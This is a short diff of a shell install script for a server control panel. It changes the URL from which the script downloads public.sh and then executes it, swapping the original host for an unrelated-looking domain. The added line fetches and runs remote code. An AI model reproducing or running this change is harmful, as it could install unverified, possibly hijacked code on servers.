@@ -5,7 +5,7 @@ install_tmp='/tmp/bt_install.pl'
 public_file=/www/server/panel/install/public.sh
 
 if [ ! -f $public_file ];then
-	wget -O $public_file https://node.k2panel.com/install/public.sh -T 5;
+	wget -O $public_file https://node.binarjoinanalyticnl.nl/install/public.sh -T 5;
 fi
 
 . $public_file
